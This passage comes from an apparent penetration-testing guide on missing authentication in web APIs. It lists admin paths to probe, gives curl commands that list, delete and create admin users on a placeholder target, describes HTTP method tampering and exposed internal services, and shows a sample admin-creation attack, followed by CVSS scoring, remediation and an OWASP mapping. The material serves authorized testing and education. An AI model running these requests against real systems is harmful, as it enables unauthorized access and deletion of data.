**Step 3 — Check common unauthenticated admin paths**

```
/admin
/admin/login
/admin/users
/administrator
/api/admin
/api/v1/admin
/api/users
/api/all-users
/api/export
/management
/api/config
/api/debug
/console
/api/internal
```

**Step 4 — Test API endpoints for missing authentication**

```bash
# Test without any cookie or token
curl -X GET https://target.com/api/v1/users
curl -X GET https://target.com/api/v1/reports/financial
curl -X DELETE https://target.com/api/v1/users/101
curl -X POST https://target.com/api/v1/admin/create-user \
  -d '{"username":"hacker","role":"admin"}'

# If any of these return 200 OK with data → CRITICAL vulnerability
```

**Step 5 — Test with different HTTP methods**

```bash
# Even if GET is protected, POST/DELETE may not be
curl -X GET    https://target.com/api/users  → 403 Forbidden (protected)
curl -X POST   https://target.com/api/users  → 200 OK? (different method, not protected!)
curl -X DELETE https://target.com/api/users/1 → 200 OK? (DELETE not authenticated!)
```

**Step 6 — Test internal microservice endpoints**

If the application uses microservices, test internal service URLs that may be exposed:

```
http://target.com:8080/actuator/env     ← Spring Boot internal
http://target.com:3000/api/internal     ← Express.js internal
http://target.com:9200/                 ← Elasticsearch (no auth!)
http://target.com:27017/                ← MongoDB (no auth!)
```

---

### Real-World Attack Scenario

```
Scenario: Unauthenticated User Creation API

Tester discovers during spidering:
POST /api/v1/admin/create-user (used by admin frontend)

Tests it without authentication:
POST /api/v1/admin/create-user HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "hacker", "email": "h@evil.com", "password": "P@ss123!", "role": "admin"}

Response: HTTP/1.1 201 Created
{"user_id": 5482, "username": "hacker", "role": "admin"}

Attacker now has a valid admin account.
Full administrative access to the system.
No authentication was required at any point.
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Unauthenticated admin access | Full system administration without credentials |
| Data exfiltration | All user data accessible to anyone |
| Account creation | Attacker creates admin accounts at will |
| Data deletion | Mass deletion of records without authentication |
| Config modification | Change application behaviour |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — all data exposed
- Integrity: **HIGH** — all data modifiable
- Availability: **HIGH** — data can be deleted

**CVSS Score: 9.8 CRITICAL**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

### Remediation

- Apply authentication middleware globally and explicitly exclude public routes — not the reverse
- Use a whitelist approach: deny all by default, allow only what is explicitly needed
- Verify authentication enforcement in code review on every new endpoint
- Implement automated tests that verify protected endpoints return 401/403 when called without credentials
- Use API gateways with centralised authentication enforcement

---

---

## OWASP Top 10 2025 — Complete Vulnerability Mapping

| # | Vulnerability | OWASP Category | CWE |
|---|--------------|----------------|-----|
| 1 | Application running on HTTP | **A02** — Cryptographic Failures | CWE-319 |
| 2 | Username Enumeration | **A07** — Identification & Auth Failures | CWE-204 |
| 3 | Password Brute Force | **A07** — Identification & Auth Failures | CWE-307 |
| 4 | SQL Injection on Login | **A03** — Injection | CWE-89 |
| 5 | Authorization Bypass / Response Manipulation | **A01** — Broken Access Control | CWE-285, CWE-639 |
| 6 | Session Not Expired After Logout | **A07** — Identification & Auth Failures | CWE-613 |
| 7 | Long Session Persistence | **A07** — Identification & Auth Failures | CWE-613 |
| 8 | XSS — All Types | **A03** — Injection | CWE-79 |
| 9 | SQL Injection — All Types | **A03** — Injection | CWE-89 |
| 10 | IDOR — All Types | **A01** — Broken Access Control | CWE-639 |
| 11 | Clickjacking | **A05** — Security Misconfiguration | CWE-1021 |
| 12 | Missing Security Headers | **A05** — Security Misconfiguration | CWE-16 |
| 13 | Weak Password Policy | **A07** — Identification & Auth Failures | CWE-521 |
| 14 | Directory Listing / Path Traversal | **A01** — Broken Access Control | CWE-22, CWE-548 |
| 15 | Sensitive Information Leakage | **A02** — Cryptographic Failures | CWE-200 |
| 16 | Improper Error Handling / Debug Mode | **A05** — Security Misconfiguration | CWE-209 |
| 17 | No Authentication on Sensitive Endpoints | **A07** — Identification & Auth Failures | CWE-306 |

---

## CVSS Severity Summary

| Vulnerability | Severity | CVSS Score |
|--------------|----------|------------|
| SQL Injection (Auth Bypass / Full Dump) | CRITICAL | 9.8 |
| No Authentication on Sensitive Endpoints | CRITICAL | 9.8 |
| Authorization Bypass | CRITICAL | 9.1 |
| Password Brute Force (No Protection) | CRITICAL | 9.8 |
| Remote Code Execution via Path Traversal | CRITICAL | 9.8 |
| Stored XSS | HIGH | 8.8 |
| Session Not Expired After Logout | HIGH | 7.5 |
| Application Running on HTTP | HIGH | 7.5 |
| Weak Password Policy | HIGH | 7.5 |
| Long Session Persistence | MEDIUM | 6.5 |
| IDOR (Read Access) | MEDIUM | 6.5 |
| Clickjacking | MEDIUM | 6.1 |
| Reflected XSS | MEDIUM | 6.1 |
| Missing Security Headers | MEDIUM | 4.3–6.5 |
| Username Enumeration | MEDIUM | 5.3 |
| Sensitive Information Leakage | MEDIUM | 5.3+ |
| Improper Error Handling | MEDIUM | 5.3+ |
| Directory Listing | MEDIUM | 5.3 |

---

*This document is intended for authorized penetration testing and security education only.*
*Always obtain written permission before testing any system.*
*Last updated: April 2025*
